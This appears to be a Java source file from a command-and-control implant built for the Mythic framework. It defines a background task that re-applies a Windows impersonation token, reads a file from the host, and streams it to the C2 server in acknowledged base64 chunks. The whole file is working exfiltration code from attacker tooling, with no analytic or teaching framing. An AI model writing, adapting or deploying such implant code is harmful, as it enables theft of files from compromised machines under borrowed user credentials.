package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.woopsie.Config;

import java.io.FileInputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * Background task for handling file downloads with chunking
 * Runs in a separate thread and communicates via queues
 */
public class DownloadBackgroundTask implements Runnable {
    
    private static final int CHUNK_SIZE = 512000; // 512KB chunks
    private final BackgroundTask task;
    private final Config config;
    private final ObjectMapper objectMapper;
    private final String fullPath;
    private final int totalChunks;
    private final com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken;
    
    public DownloadBackgroundTask(BackgroundTask task, Config config, String fullPath, int totalChunks, com.sun.jna.platform.win32.WinNT.HANDLE impersonationToken) {
        this.task = task;
        this.config = config;
        this.objectMapper = new ObjectMapper();
        this.fullPath = fullPath;
        this.totalChunks = totalChunks;
        this.impersonationToken = impersonationToken;
    }
    
    @Override
    public void run() {
        try {
            // Re-apply impersonation token if present (each thread needs its own token applied)
            if (impersonationToken != null) {
                Config.debugLog(config, "Re-applying impersonation token in download background thread");
                com.woopsie.utils.WindowsAPI.reApplyToken(impersonationToken);
            }
            
            Config.debugLog(config, "Download background task started: " + task.getTaskId());
            
            // Wait for the initial message with file_id from Mythic
            JsonNode initialMessage = task.receiveFromTask();
            if (initialMessage == null) {
                Config.debugLog(config, "Download task received null initial message, exiting");
                return;
            }
            Config.debugLog(config, "Received initial message: " + initialMessage);
            
            String fileId = initialMessage.get("file_id").asText();
            
            Config.debugLog(config, "Starting download of " + totalChunks + " chunks for file: " + fullPath);
            
            // Send all chunks
            Path path = Paths.get(fullPath);
            try (FileInputStream fis = new FileInputStream(path.toFile())) {
                for (int chunkNum = 1; chunkNum <= totalChunks; chunkNum++) {
                    Config.debugLog(config, "Sending chunk " + chunkNum + " of " + totalChunks);
                    
                    // Read chunk
                    byte[] buffer = new byte[CHUNK_SIZE];
                    int bytesRead = fis.read(buffer);
                    
                    if (bytesRead <= 0) {
                        Config.debugLog(config, "No data read for chunk " + chunkNum);
                        break;
                    }
                    
                    // Encode chunk as base64
                    String chunkData = Base64.getEncoder().encodeToString(
                        bytesRead < CHUNK_SIZE ? java.util.Arrays.copyOf(buffer, bytesRead) : buffer
                    );
                    
                    // Create chunk response
                    Map<String, Object> chunkResponse = new HashMap<>();
                    chunkResponse.put("chunk_num", chunkNum);
                    chunkResponse.put("file_id", fileId);
                    chunkResponse.put("chunk_data", chunkData);
                    chunkResponse.put("chunk_size", bytesRead);
                    
                    Map<String, Object> result = new HashMap<>();
                    result.put("task_id", task.getTaskId());
                    result.put("download", chunkResponse);
                    
                    // Send chunk response
                    task.sendResponse(result);
                    
                    // Wait for acknowledgment from Mythic before sending next chunk
                    JsonNode ack = task.receiveFromTask();
                    if (ack == null) {
                        Config.debugLog(config, "Download task received null ack, stopping transfer");
                        break;
                    }
                    Config.debugLog(config, "Received ack for chunk " + chunkNum);
                }
            }
            
            // Send final completion message (matches oopsie - just file_id in user_output)
            Map<String, Object> completion = new HashMap<>();
            completion.put("task_id", task.getTaskId());
            completion.put("completed", true);
            completion.put("status", "success");
            completion.put("user_output", fileId);
            
            task.sendResponse(completion);
            Config.debugLog(config, "Download completed: " + fileId);
            
        } catch (Exception e) {
            Config.debugLog(config, "Download background task failed: " + e.getMessage());
            if (config.isDebug()) {
                e.printStackTrace();
            }
            
            // Send error response
            Map<String, Object> error = new HashMap<>();
            error.put("task_id", task.getTaskId());
            error.put("completed", true);
            error.put("status", "error");
            error.put("user_output", "Download failed: " + e.getMessage());
            
            task.sendResponse(error);
        }
    }
}
